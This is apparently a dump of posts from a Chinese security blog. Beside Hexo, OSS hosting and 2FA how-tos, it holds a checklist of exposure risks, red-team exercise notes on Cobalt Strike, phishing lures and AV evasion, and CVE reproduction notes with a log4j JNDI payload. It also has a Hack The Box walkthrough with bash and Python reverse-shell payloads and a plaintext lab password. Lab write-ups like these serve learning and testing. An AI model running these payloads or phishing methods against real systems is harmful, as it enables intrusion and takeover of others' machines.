在写文章的过程中，不可避免地会涉及到插入图片的需求。那么，问题来了，图片应该存储在哪里呢？ 一种常见的解决方案是使用图床。当博文中包含大量图片时，将图片直接存放在博客源代码中（通常是source文件夹）可能不太合适，因为这样会占用大量存储空间，而且加载速度也相对较慢。 因此，可以考虑将博文中的图片上传到图床，然后获取外部链接。这样做的好处是，可以极大地节省存储空间，并且加快网页加载速度。在使用Markdown语法插入图片时，只需使用外部链接即可完成插入![图片信息](外部链接) 我在这边使用的方案是“阿里云 OSS”，首先你需要一个阿里云账号，然后下载oss-browser，阿里云 OSS 的桌面客户端，剩余操作阅览官方文档即可 对象存储 OSS_云存储服务_企业数据管理_存储-阿里云 (aliyun.com) **费用：**值得注意的是，40G一年为9元左右，对于个人网站来说，绰绰有余 三、安全 B 站 UP 主，程序员鱼皮，曾经在 2023-03-04 发生过阿里云 OSS 被盗刷而透支费用. https://www.bilibili.com/video/BV1Tb411Q7V4/?spm_id_from=333.999.0.0&amp;vd_source=07d8fe8fdf49a7cf86a5c7925adf3667 1. 危害 未正确配置存储桶的访问策略或未限制访问来源。 如果设置了ListObject，这将会导致Bucket桶被遍历。 图床地址被暴露给第三方。 2. 解决方案 阿里云 OSS + Cloudflare 是指将对象存储服务（OSS）与内容分发网络（CDN）服务结合使用的一种方案。Cloudflare 的 CDN 用于加速，仅仅通过 CDN 访问资源，而 OSS 则提供存储支持。使用CDN服务，可以减少对源服务器的请求，进而降低了OSS成本。 Bucket 将 Bucket 访问权限改为私有 防盗链 开启防盗链，只设置白名单，为你的https://xxx.github.io 防盗链策略会根据 Referer 的值来判断请求是否合法，如果来源页面不是本站或者是允许的站点，则允许访问资源；否则，拒绝访问或者重定向到其他页面。 启动防盗链，空 Referer 设置为不允许时，在 Typora 编辑中，则无法显示，暂无法解决 消费预警 四、后记 如果文章有错误的地方，还请各位批评指正。","tags":["Hexo"],"categories":["杂谈闲记"]},{"title":"DDoS 攻击","path":"/2024/01/09/DDoS 攻击/","content":"什么是DDoS攻击呢？ 其实，DDoS攻击，全称是“分布式拒绝服务攻击”（Distributed Denial of Service）， 听起来有点长，但你可以简单地把它想象成一群“坏人”同时涌向一家小小的店铺。这家店铺原本可以轻松接待每天的正常顾客，但是突然来了成千上万的“坏人”，把店铺门口堵得水泄不通，真正想进去买东西的顾客（也就是我们这些正常用户）就被挤在外面，根本进不去，店铺也因此无法正常营业了。 在互联网世界里，“店铺”就是网站、服务器或者网络服务。 “坏人”就是来自各处的恶意网络流量。 这些流量像潮水一样涌向目标，消耗目标的网络带宽和服务器资源，最终导致目标服务器不堪重负，无法响应正常的请求，我们就没办法正常访问网站、使用APP，或者进行在线游戏等等。 DDoS攻击有很多种类型，但目的都是一样的：让你的服务变得不可用。 简单来说，DDoS攻击就是通过大量的无效请求，拥堵网络通道或服务器，使得正常用户无法访问目标服务。 如何判断DDoS攻击呢？ 需要观察网站的访问速度、网络流量、服务器资源、日志信息，以及安全设备的警报等 网站或服务突然变得非常慢，甚至完全无法访问： 就像你平时浏览网页很流畅，突然之间网页打开特别慢，或者直接显示“无法访问此网站”。 网络流量异常飙升： 流量激增往往超出正常的用户访问量，可能是攻击者在发送大量的无效请求。 服务器资源消耗异常增高： DDoS攻击会消耗服务器的CPU、内存、带宽等资源。如果发现服务器资源占用率突然变得非常高，甚至达到100%，而正常的业务请求并没有显著增加，这也可能是DDoS攻击造成的。 出现大量的错误请求或连接请求： 在服务器的日志中，可能会出现大量的错误请求（例如404错误、500错误）或者连接请求失败的记录。 这些记录可能表明有大量的恶意流量在尝试访问服务，但服务器已经无法正常处理。 安全设备发出警报： 如果你使用了防火墙、入侵检测系统（IDS）、DDoS防护设备等安全设备，这些设备可能会检测到异常流量或攻击行为并发出警报。","tags":["DDOS"],"categories":["网络安全"]},{"title":"Stellar 主题优化","path":"/2024/01/03/Stellar主题优化/","content":"字体 因为该频道的定位是文章记录，所以文本在显示时易于阅读，是首先要考虑的。 由于经常使用微信读书 APP，去阅读文字，而当时的选择恰恰是霞鹜文楷，用此字体一年有余，故此频道也继承而来。 本地字体引用 LXGW WenKai Screen / 霞鹜文楷屏幕阅读版 后来注意到作者 xaoxuu 提醒 但是我个人并不推荐引用本地字体，相比于英文字体，中文字体囊括了众多的字符，这也无法避免地导致字体文件体积的增加，拿 Noto Serif SC 来说，单个 ttf 文件就有 9mb 之大，这对于您的站点而言加载速度可想而知。 遂放弃本地字体引用 参考：利用 [霞鹜文楷] 美化网站字体 MyBlog\\themes\\stellar\\_config.yml 根据优先级，使用 LXGW WenKai Screen 字体作为文本的主要字体。 123456789# CSS 中写入 font-family: body: &#x27;&quot;LXGW WenKai Screen&quot;, sans-serif, &quot;system-ui&quot;, &quot;Microsoft Yahei&quot;, &quot;Segoe UI&quot;, -apple-system, Roboto, Ubuntu, &quot;Helvetica Neue&quot;, Arial, &quot;WenQuanYi Micro Hei&quot;, sans-serif&#x27; # inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css&quot; media=&quot;print&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; script: PS：注意缩进，不然无法hexo g会报错 顶部 tab 栏 MyBlog\\themes\\stellar\\_config.yml 1234nav_tabs: # 近期发布 分类 标签 专栏 归档 and ... # &#x27;朋友文章&#x27;: /friends/rss/ &#x27;安全资讯&#x27;: /cybernews/index.html &#x27;留言板&#x27;: /comments/index.html 侧边栏配置 12345title: 网站名称avatar: 头像logo: subtitle: &#x27;&#x27; # &#x27;文字1 | 文字2&#x27; (鼠标放上去会切换到文字2) 评论 ……","tags":["Hexo","美化","Stellar"],"categories":["杂谈闲记"]},{"title":"大隐隐于市","path":"/2024/01/01/大隐隐于市/","content":"4726bbc9ea369f744cf597d75ccaf73bd3e307ae2b7d5a8eee172021da6b7cf60b2a1e4efbab6b21a9bf12b0af937d1d21a309e57f8ffd24b8cfcff883571f9de14949db8f92acec21b39fdc1bd9e5cc2049b426228155302029c01816139f261427d4d045e9df3f80b9917e281da86729ac18f9ced51f2268d6605549e3ba09ac70fd2d7c23f841c7dbfe04e5a7c1c1 欲救生快活，须下死功夫"},{"title":"Nessus本地安装 - 网络基础设施漏洞扫描器","path":"/2023/11/01/Nessus安装/","content":"前言： 一般情况下， 客户内网环境情况下，需在本机部署 Nessus 并携带至现场进行漏洞扫描，记录一下安装步骤。 Nessus的扫描对象，不止有服务器，还有操作系统、网络设备、服务等。 后续重点在于更新、维护Nessus插件。 访问：https://localhost:8834/#/ 现在，Nessus没有插件，受到限制 Nessus has no plugins. Therefore, functionality is limited.d 破解……","tags":["网安工具"],"categories":["网络安全"]},{"title":"手把手教你开启 GitHub 2FA 双重验证（适合国内用户）","path":"/2023/09/20/2FA（双重身份验证）如何开启（China）/","content":"最近收到 GitHub 的通知说必须开启 2FA 验证，不然可能会限制账号使用。那到底什么是 2FA？要怎么开启呢？ 什么是 2FA？ 简单来说，2FA 就是&quot;两步验证&quot;。比如你登录 GitHub 的时候，除了输入密码，还得输入一个动态验证码。这样即使密码被盗，别人要登你的账号也得拿到验证码才行，安全性大大提高。 开启 2FA 很简单 首先，你得先装个验证器。我推荐用这个 Chrome 插件： 身份验证器 Authenticator Extension 安装完后，按下面步骤操作： 登录 GitHub，点右上角头像→Settings（设置） 找到&quot;Password and authentication&quot;→&quot;Enable two-factor authentication&quot; 选择验证方式： 用验证器 App（推荐）：扫描 GitHub 给的二维码，然后输入验证器显示的 6 位数字 用短信验证：不过目前好像不支持中国手机号（+86） 记得保存恢复码！这个超级重要。GitHub 会给你几组备用码，一定要找个安全的地方存起来。要是丢了或者换了，就靠这个恢复账号。 为啥 GitHub 非要我们开 2FA？ 其实主要有两个原因： 保护你的代码安全：GitHub 上存了那么多重要代码，要是账号被黑了多可怕。开启 2FA 后，就算密码泄露了也不怕。 GitHub 新规定：GitHub 说 2023 年底前必须所有用户都得开启 2FA。不开的话可能会限制使用，比如参与某些项目啥的。","tags":["Github","2FA"],"categories":["杂谈闲记"]},{"title":"常见暴露公网风险点","path":"/2023/08/11/常见暴露公网风险点/","content":"1. 弱口令/默认账号密码 暴露风险等级：高风险 暴露说明及危害： 系统中存在弱口令，可以轻松登录，进一步进行攻击，如上传 WebShell 或获取敏感数据。 默认账号和密码的暴露可能导致未经授权的访问和操作。 漏洞利用： 利用弱口令或默认密码进入管理后台，进行未授权操作。 修复建议： 强制用户首次登录时修改默认密码。 完善密码策略，建议密码长度至少 8 位，并包含数字、大写字母和特殊字符。 对管理后台实施访问控制，定期修改密码，并增强口令强度。 增加防暴破机制，限制 IP 和 Cookie 的访问次数。 2. 接口泄露 暴露风险等级：高风险 暴露说明及危害： Swagger生成的API文档直接暴露在特定的Web路径下，任何人都可以访问和查看。这使得用户能够获取项目的所有接口信息。 例如，如果存在文件读取相关的接口，可能会导致任意文件下载。这种访问可能导致未授权的业务操作以及敏感信息的泄露、脱敏获取密码等。 漏洞利用： 暴露的 API 文档可能让获得直接攻击服务器的攻击路径，并猜解 API 功能，给提供更具体的攻击路径。 修复建议： 将 Swagger-UI 的 URLs 加入认证和授权过滤链，仅允许经过认证的用户访问。 3. JS敏感信息泄露 暴露风险等级：高风险 暴露说明及危害： JS 代码中可能存在敏感信息（如用户名、邮箱、手机号、URL路径等），可利用这些信息进行进一步攻击。 漏洞利用： 假设已知用户名和邮箱，可以通过爆破方式尝试获取密码；同时，访问敏感路径可以获取有用信息进行进一步利用。邮箱也可以收集起来，用来发送钓鱼邮件。 修复建议： 隐藏敏感信息，并定期进行安全渗透测试以检测暴露信息。 4. PHP信息泄漏 暴露风险等级：高风险 暴露说明及危害： 某些Web站点的测试页面可能调用PHP的phpinfo()函数，该函数会输出服务器的关键信息，导致信息泄露。这些信息可以被用于制定后续的攻击策略。 漏洞利用： 通过获取组件的版本，寻找历史漏洞进行攻击 系统识别： phpinfo() 提供了服务器环境的详细信息，包括操作系统类型和版本、服务器软件等。可以使用这些信息制定针对性的攻击策略，因为不同的操作系统和软件可能有不同的安全漏洞。 模块识别： phpinfo() 还列出了已加载的PHP模块和扩展。可以利用这些信息了解服务器上是否存在特定的模块，从而针对性地尝试攻击这些模块。 路径信息： phpinfo() 可能显示PHP的配置文件路径、临时目录等信息。可以使用这些路径信息来构造文件包含攻击或利用其他路径相关的漏洞 修复建议： 删除或限制 phpinfo() 的访问，确保不对外暴露服务器的关键信息。 5. 未授权访问 暴露风险等级：高风险 暴露说明及危害： 由于没有对相关敏感页面进行访问权限的检查，（无登陆框，无审核验证直接可以访问），导致攻击者可未授权访问，从而获取敏感信息及进行未授权操作等！ 漏洞利用： 黑客发现后，在公网上直接进行访问，做增删改查的高危操作。尽管不确定是什么系统，胡乱操作也可能导致业务出现问题。 修复建议： 对敏感页面实施严格的访问权限控制，确保每个访问角色进行权限检查。 6. 目录遍历 暴露风险等级：高风险 暴露说明及危害： 由于服务器配置不当，开启了目录浏览，可获取文件目录结构，从而下载敏感文件。 漏洞利用： 通过目录遍历可获取敏感信息，获取敏感文件并近一步利用。 修复建议： 通过修改配置文件，去除中间件（如IIS、apache、tomcat）的文件目录索引功能 设置目录权限 7. 云存储信息泄露（高危） 暴露风险等级：高风险 暴露说明及危害： 存储桶未设置为私有（设置为了公有读），导致其内容可以被访问。根据业务场景的不同，云存储中的数据类型也会有所不同，这带来了很高的风险。 对个人，公开的存储桶可能泄露私密的个人信息、照片、视频等，导致隐私被侵犯，进一步导致身份盗用。 对企业，公开访问的存储桶可能泄露商业机密、敏感文件、客户数据等，影响企业声誉，导致经济损失和法律责任。 公开访问的存储桶可能泄露以下信息： 存储桶名称、存储在桶中的图片、视频、文件和应用程序，存储桶内所有资源的路径、存储桶信息的更新时间，以及存储桶资源的MD5哈希值。 漏洞利用： 可以获取存储桶中大量数据，造成数据泄露，对公司声誉造成较大影响。 修复建议： 将 Bucket 访问权限改为私有 开启防盗链，只设置白名单，防盗链策略会根据 Referer 的值来判断请求是否合法，如果来源页面不是本站或者是允许的站点，则允许访问资源；否则，拒绝访问或者重定向到其他页面。 B 站 UP 主，程序员鱼皮，曾经在 2023-03-04 发生过阿里云 OSS 被盗刷而透支费用。 没想到又被攻击了！赔了1.5万，我真服了！ 针对以上，个人使用OSS云存储的情况下，我们可以开启 消费预警 8. 错误页面信息泄露 暴露风险等级：高风险 暴露说明及危害： 返回详细的错误信息可能会泄露服务器的内部信息，包括服务器代码、数据库连接信息、SQL语句、个人信息以及敏感文件的路径，这些信息为信息收集提供了便利。 漏洞利用： 通过获取服务器的后端版本、框架和绝对路径等信息，可能导致针对这些暴露信息的进一步利用。 修复建议： 在编码时添加异常处理模块，统一定制错误页面，避免展示服务器版本信息； 不对外公开程序运行时的异常错误详情； 最好禁止返回任何与系统相关的信息，以降低风险 9. 短信/邮件轰炸 暴露风险等级：高风险 暴露说明及危害： 短信/邮件轰炸（仅仅是指直接点击发送短信按钮，即可造成轰炸，非进一步探测，漏洞利用而造成的轰炸，二者不可相提并论）。 由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉！ 短信话费金额骤升。 漏洞利用： 通过短信或邮件炸弹，进行公司短信或邮件资源进行消耗。 修复建议： 限制发送次数，设置合理的频率限制。 10. 内部系统登录页暴露 暴露风险等级：高风险 暴露说明及危害： 内部系统登录页对外暴露，搜集信息完备的情况下，有概率获取内网权限。 修复建议： 收敛内部统一身份认证系统，限制外部访问。 11. 测试平台泄露 暴露风险等级：高风险 暴露说明及危害： 测试平台的公开暴露可能导致测试代码、测试账号、默认账号等敏感信息的泄露，这可能被利用来进行进一步的攻击。 漏洞利用： 通过攻击测试平台获取权限，或在成功攻击后获取一些信息，从而攻击真实的业务平台。 修复建议： 建议关闭测试平台对外开放，以防止敏感信息的泄露。 12. 默认界面及中间件Web入口 暴露风险等级：中风险 暴露说明及危害： 在搭建网站或应用程序时，通常会生成一个默认的欢迎页面或管理界面。如果这些默认界面被公开而且没有经过适当的配置，就可能带来安全隐患。攻击者可以利用这些默认页面的信息来识别系统的弱点，进而进行有针对性的攻击。 相关中间件： Nginx OpenResty WildFly 8 IIS Apache Tomcat Apache2 Ubuntu XAMPP Tengine Oracle 漏洞利用： 根据已知的历史版本漏洞，攻击者可能会得知使用的产品及其版本，从而找到已知的弱点进行攻击。 修复建议： 不要让别人看到这些默认页面，修改默认文档设置以指向自定义首页。 只有必需功能被开放给最终用户访问.。 13. 源IP泄露 暴露风险等级：高风险 暴露说明及危害： 通过直接访问IP地址，系统可能成为网络攻击的目标，绕过访问控制。 修复建议： 使用域名访问：尽量使用域名而不是IP地址进行访问，以提升系统的安全性和可管理性。 配置访问控制：使用防火墙和访问控制列表（ACL）来限制对系统的访问，仅允许必要的服务和端口对外开放，并拒绝未经授权的访问。 限制对敏感信息的访问：如果可能，将敏感信息存储在内部网络中，并限制对这些信息的直接外部访问，或使用零信任。 14. 暴露系统版本 暴露风险等级：中风险 暴露说明及危害： 暴露的系统版本信息可能使攻击者获取有关系统的关键信息，从而进行进一步的攻击。攻击者可以通过收集系统版本信息，寻找与该版本相关的已知漏洞，并利用这些漏洞获取对服务器的控制权限。 修复建议： 通过修改或隐藏系统版本信息，防止攻击者对系统对应版本进行攻击。 15. VPN登录口 暴露风险等级：高风险 暴露说明及危害： VPN软件的类型和版本。这些信息可以被攻击者用来研究可能的漏洞。暴露VPN登录口可能扩大整个网络的攻击面，攻击者可能通过这一接口找到其他可利用的内部资源。 修复建议：限制VPN登录口的公网访问权限","tags":["暴露面"],"categories":["网络安全"]},{"title":"2023 年某直辖市通管局攻防演练总结","path":"/2023/07/31/2023年某直辖市通管局攻防演练总结/","content":"攻击路径 目标1——敏感信息泄露 通过对备案域名进行信息收集，获取到相关域名，访问并查看JS文件，获取到敏感信息。 目标2——域名备案管理系统弱口令漏洞 通过信息收集得到相关地址，使用弱密码登录后台，获取配置信息，其中包含云存储的“KEY”，进而访问云存储，查看敏感文件。 目标3——全版本源代码泄露（2亿3千万行）、目录遍历 通过信息收集发现该资产，进行目录遍历，确认全版本源代码的泄露，涵盖游戏各个功能模块。 目标4——数据中心弱口令攻击获取超级管理员权限 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台，获得超级管理员权限。 目标5——后台登录中心源代码泄露、游戏装备数据泄露 通过信息收集，利用.git泄露获得该站点的源代码，获取到包含敏感信息的Excel文件。 目标6——存储管理系统弱口令 通过信息收集得到相关地址，使用弱密码登录后台，获取配置信息，并访问云存储。 目标7——File**站点弱口令 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台。 目标8——***GM后台弱口令 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台，获得管理员权限。 目标9——***后台弱口令，存在RCE 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台并获取管理员权限，发现存在远程命令执行漏洞。 渗透成果说明 通过信息收集，得到多个平台，使用弱密码（如 admin/123456）登录后台。 通过密钥信息，进入云存储获得敏感代码文件。 总结 因为信息收集的质量和深度直接影响了攻防演练的效果和成果，所以在此次攻防中，主要手法是不断扩大信息收集的范围，找到薄弱的资产；一方面，从信息收集的工具来说，我们采用多个平台、多个工具，多管齐下；另一方面，对搜集的资产进行指纹识别，识别出重点资产，重点关注OA、邮件、网站后台管理等容易存在大量上传点的系统，寻找弱口令进入，在大量的信息中，检索出真正存在问题的资产，是一个繁复的过程。而在此次攻防中，总共找到了7个弱口令，对于弱口令的挖掘，收益颇丰，有赖于信息收集的广度。 但使用钓鱼攻击有收获但微乎其微，一方面是因为对钓鱼的利用方式不熟练，另一方面对免杀的了解程度不够，对攻防演练更新迭代的攻击手法不够了解，且规则既定，但游离于规则之外称之为行业内的潜规则也绊了我们一脚。","tags":["攻防演练"],"categories":["网络安全"]},{"title":"2023 年某直辖市通管局攻防演练碎碎念","path":"/2023/07/31/2023年某直辖市通管局攻防演练碎碎念/","content":"背景 2023年pánshí行动于崇明区长兴岛开展，三人组队代表公司参加活动，以下是一些碎碎念…… 每天必做 录屏、上传录屏 信息搜集工具 环境 名称 作用 Xshell-云服务器 水泽 信息收集 Xshell-云服务器 Oneforall 查询子域名 Xshell 灯塔 信息收集 Windows平台 零零信安 信息收集，只能一个账号登录 Windows平台 EHole 指纹识别 Windows平台 Enscan 查询控股公司 Windows平台 FofaViewer 信息收集 Windows平台 站长工具 查询备案归属 Windows平台 爱企查 查询公司备案 Windows平台 天眼查 查询公司备案 Windows平台 CS客户端 钓鱼、木马 **行动跳板机 CS服务端 钓鱼、木马 Windows平台 EmailALL 搜集公司邮箱 Xshell Goby …… 流水账 2023年7月20日11:05:38 搭建了灯塔平台——ARL资产灯塔系统搭建 2023年7月20日11:09:44 研究钓鱼，规则文件： 在使用社会工程学攻击、钓鱼攻击及水坑攻击时，禁止使用涉及政治因素，违背伦理道德等因素的缘由进行攻击，否则将对攻击方进行扣分处理。 红蓝对抗 | 企业级攻防演练钓鱼行动 时间 了解员工上下班时间 邮件内容 通知类（漏洞预警、修改口令、红头文件等） 福利类（节日礼包、礼卷等） 热点新闻类（防疫新闻、俄乌战争等）。 2023年7月20日11:31:22 申请**行动服务器，Centos7.0，安装python3、jdk11 2023年7月20日15:22:38 免杀技术 - go shellcode 加载 bypassAV 看资源修改、伪造签名 2023年7月20日17:55:30 沟通云服务器，OA审批流程 2023年7月20日19:06:38 使用Docker部署思源笔记，在公司Centos服务器上 使用Docker部署思源笔记，可通过WEB访问 发现一个工具：EASY233/Finger: 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 和Ehole有什么不同呢？ 2023年7月21日10:20:00 Centos7.0，安装python3、和jdk11 2023年7月21日10:41:24 安装 Cat CS，二次开发 猫猫Cs:基于Cobalt Strike[4.5]二开 (原dogcs二开移植) 解压密码：低调求发展潜心习安全好好学习天天向上 Windows端，运行java -jar cat_client.jar client 2023年7月21日13:31:18 我在Windows端已经可以运行CobaltStrike_Cat_4.5，我如何把 CobaltStrike sever 端上传到**行动的跳板机 安装的CS服务端 2023年7月21日15:24:30 终于装好啦！！！ 2023年7月21日16:01:37 安装搜集邮箱的工具 Taonn/EmailAll.git https://github.com/Taonn/EmailAll.git 12345678910111213141516171819# http://www.veryvp.com/veryvp_username = &#x27;****&#x27;veryvp_password = &#x27;****&#x27;# https://www.github.com# 新# 旧github_token = &#x27;&#x27;****&#x27;&#x27;# https://app.snov.io/snov_username = &#x27;&#x27;****&#x27;&#x27;snov_password = &#x27;&#x27;****&#x27;&#x27;# https://phonebook.cz/pb_key = &#x27;&#x27;****&#x27;&#x27; 12# *****python3 emailall.py --domain *****.com run # ✅ 2023年7月21日17:01:37 思考钓鱼内容 …… 2023年7月21日19:58:59 去找一下XX公司的后台，是邮箱登录的 批量跑一下XX公司的邮箱 2023年7月22日11:19:39 今天遇到了一点麻烦，拓展坞的网口坏了，得重新购买一个，幸亏，京东有次日达。队友也好心借给我一个拓展坞，但我只有一个Type-C接口，要么充电、要么联网…… 霉运袭来，平台密码总是忘记，导致裁判几乎每个人都认识我。 现在的任务有三条 水群 找XX公司的邮箱 找XX公司的后台 时刻录屏 2023年7月22日15:18:59 我点击木马之后，出现的上线通知 2023年7月22日15:45:11 购买126邮箱 ➜ ✅ 携程的邮箱 2023年7月22日19:09:31 谷歌语法看PDF泄露 2023年7月22日19:45:24 拼多多资产，队友搜集出来的，找出重点资产，把所有文件的域名提取出来，然后跑指纹识别 插曲：出现CS上线 ➜ 权限维持 2023年7月23日10:10:35 XX公司的数据 XX公司的 IP 去重复，扔 goby 里面跑 2023年7月23日14:50:24 写报告，写完啦 2023年7月23日14:50:30 找一下XX公司人名的微信号 MP4 图标 ICO MSF 等上线 2023年7月23日16:08:32 会不会钓鱼！忽悠他，发EXE 攻防演练非常激烈，有一家红队，解锁了全部的公司，超前完成任务（可能是微步在线） 2023年7月24日15:09:11 跑子域名 关于攻击守则的再次强调声明 1.攻击禁止影响业务正常运行 2.禁止擅自修改密码，如必要，提交攻击申请 3.禁止场外攻击 4.报告中重要截图需包含时间戳 5.**行动期间需要在录屏前提下进行 6.禁止使用场外攻击资源 公告关于每日结束后的提醒 请各位红队选手，为配合场地消防安排，在每日完成攻击后，将操作台上的电源关闭或拔出。务必保存好自己当天晚上编写的相关报告及录屏等内容，工作人员将在全员离场后进行检查，如发现电源未关闭，工作人员将拔出，请各位攻击队注意！ 警告关于钓鱼攻击方式的新要求 今日起所有钓鱼攻击，请各位攻击队优先递交攻击申请或钓鱼内容说明，通过后才可执行。若今日已经发送的钓鱼攻击，请在平台补充递交攻击申请。 注意事项 自动提取域名工具 确保使用适当工具从网页文本中提取顶级根域名或主域名。 提前登录，因为不让带手机进场 — 使用的平台：如“天眼查”、“企查查”等。 注意事项（因为不让带手机into……）： QQ 邮箱：网络问题可能导致无法登录。 谷歌账号：需进行二次验证。 环境配置 提前搭建虚拟机、云服务器等必要环境。 网络问题 关注拓展坞的网口问题。 录屏软件 熟悉使用录屏软件，确保操作记录清晰。 虚拟机搭建 根据需要创建多个虚拟机，实际上我们队友都是用的本机，lol，用虚拟机方便清空现场资料，对方不让带走！！","tags":["攻防演练"],"categories":["网络安全"]},{"title":"已知漏洞复现与验证","path":"/2023/03/09/Reproducible vulnerability/","content":"以下是一些已知的漏洞及其相关信息，供研究和复现使用 CVE-2019-6341✔ 在 kali 上使用 vulhub 环境，先进入目录vulhub/drupal/CVE-2019-6341 123# 启动 docker，启用环境sudo service docker startdocker-compose up -d 在浏览器访问：http://127.0.0.1:8080 12345# 上传 POCphp blog-poc.php 127.0.0.1 8080# 访问，FireFox 过滤了 XSS，所以不弹窗http://127.0.0.1:8080/sites/default/files/pictures/2023-02/_0 漏洞利用 drupal 文件上传模块，文件内容是 HTML 代码，但 JS 代码包含其中 &lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt; CVE 2014-4210✔ vulhub/weblogic/ssrf at master · vulhub/vulhub (github.com) 在 kali 上使用 vulhub 环境，先进入目录vulhub/weblogic/ssrf 123# 启动 docker，启用环境sudo service docker startdocker-compose up -d Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。 访问http://127.0.0.1:7001/uddiexplorer/，查看 uddiexplorer 应用。 点击 Search Public Registries 进行抓包 未完…… thinkcmf-x1.6.0-x2.2.3✔ ThinkCMF 是一个基于 ThinkPHP 框架开发的内容管理框架。可利用此漏洞构造恶意的url，向服务器写入任意内容的文件，达到远程代码执行的目的 下载ThinkCMF2.2.2版本，X2.2.2 ·ThinkCMF/CMFX (github.com)，解压后放到 phpstudy 环境的 web 根目录下 然后，输入数据库密码 root，设置用户名、密码、邮箱等完成安装设置 log4j2-cve-2021-44228✔ 环境搭建 使用 vulhub，切换到漏洞目录 1cd /root/vulhub/log4j/CVE-2021-44228 漏洞复现 先利用 dnslog 查看回显，然后测试网站 1http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://f4ae3u.dnslog.cn&#125; 工具使用https://github.com/bkfish/Apache-Log4j-Learning/ 1git clone https://github.com/bkfish/Apache-Log4j-Learning.git 构造 payload 使用 base 64加密 1bash -i &gt;&amp; /dev/tcp/192.168.31.137/8983 0&gt;&amp;1 …… XXE 漏洞 | rrodrigo/xxelab✔ 环境搭建 1234# 下载镜像docker pull rrodrigo/xxelabdocker run -d -p 8082:80 rrodrigo/xxelab 将主机的 8082 端口映射到容器的 80 端口上，在浏览器中访问映射出来的端口，http://localhost:8082 漏洞复现 通过用 burp 抓包发现是 xml 格式 12345&lt;!DOCTYPE c [&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot;&gt;]&gt;# 定义了一个名为 file 的实体，它的值是 /etc/passwd，这是一个包含系统用户信息的文件。 Tips / 提示 在 XML 中，实体是可以被引用的对象，类似于变量。当 XML 解析器解析包含该实体的 XML 文档时，它会将实体引用替换为实体的实际值。攻击者可以构造恶意的 XML 数据，将实体引用插入到数据中，从而让 XML 解析器读取和输出 /etc/passwd 文件的内容。 CVE-2017-12615（tomcat-pass-getshell） 环境搭建 使用 vuluhub 的 docker 进行漏洞复现 漏洞复现 …… CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台 先找到目录：vulhub/weblogic/CVE-2020-14882 12cd vulhub/weblogic/CVE-2020-14882 docker-compose up –d 2.进入 vulhub/weblogic/CVE-2020-14882 目录下，使用命令docker-compose up –d启动环境 3.浏览器访问：你的 ip:7001/console/login/LoginForm.jsp 成功访问表示环境搭建成功 log4j2-rce-2021-12-09 环境搭建 12345# 使用dockerdocker pull vulfocus/log4j2-rce-2021-12-09# 启动docker容器docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09 漏洞复现 ……未完待续 wordpress_cve_2019_15866 showdoc-cnvd_2020_26585 CVE-2019-9670（远程代码执行漏洞复现） CVE-2020-5412 phpmyadmin-cve_2014_8959","tags":["CVE"],"categories":["漏洞复现"]},{"title":"Precious — Hack The Box Machine","path":"/2023/03/08/Precious/","content":"介绍 在虚拟机中进行连接 1sudo openvpn 名称.ovpn 出现 Initialization Sequence Completed 代表连接成功 连接 参考： 主要参考——Hackthebox - Precious(Easy) - YouTube PreciousHTB | Hack The Box Precious| PreciousWriteUp | Hack The Box - YouTube Precious- YouTube 中等 (medium.com) Hackthebox PreciousWriteup – 0xDedinfosec Precious是 Hack the Box 上的一台简单机器，它托管了一个使用易受攻击的 pdfkit 版本的网站。使用此版本的 pdf kit 和 CVE-2022–25765，我们能够以 ruby 用户的身份获得计算机的反向 shell。然后，我们从配置文件中收集一些信息，以将我们的权限提升给其他用户。一旦我们成为用户 henry，我们就通过 YAML 反序列化使用远程代码执行将我们的权限提升给根用户。 地址：https://app.hackthebox.com/machines/513 110.10.11.189 常规探测 1234567# nmap 全端口扫描，发现开放了 22 和 80 端口，分别是 ssh 和 http 协议# -sC：运行端口侦测的默认 Nmap 脚本# -sV：探测开放端口以确定服务/版本信息nmap -sC -sV 10.10.11.18910.10.11.189:2210.10.11.189:80 网站能够输入一个 URL，它会将网页转换为 pdf 1exiftool iza6l21cttk715syc00tn5uzd4t4hgqz.pdf Google 直接搜索 pdfkit v0.8.6 vuln、pdfkit v0.8.6 exploit（意思就是搜索和 pdfkit v0.8.6 相关的漏洞 ） Command Injection in pdfkit | CVE-2022-25765 | Snyk ==找到了 PoC，把要执行的命令放在``中== 反弹 shell https://www.revshells.com/ 12# 需要设置一个侦听器，以便在获得反向 shell 后与机器进行交互。nc -nlvp 1113 12345678# 构造一个 payloadpython3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;# 放入浏览器http://10.10.16.13?name=#&#123;&#x27;%20`放入 payload`&#x27;&#125;http://10.10.16.13?name=#&#123;&#x27;%20`python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;`&#x27;&#125; 输入whoami，将会显示rudy 提权 1234567# ssh 登录ssh henry@10.10.11.189# 密码：Q3c1AqGHtoI0aXAYFHcat user.txt得到 flag 现在可以访问用户 henry，试一下可以用 root 权限运行吗，利用sudo -l 1234567-bash-5.1$ sudo -lMatching Defaults entries for henry on precious: env_reset, mail_badpass, 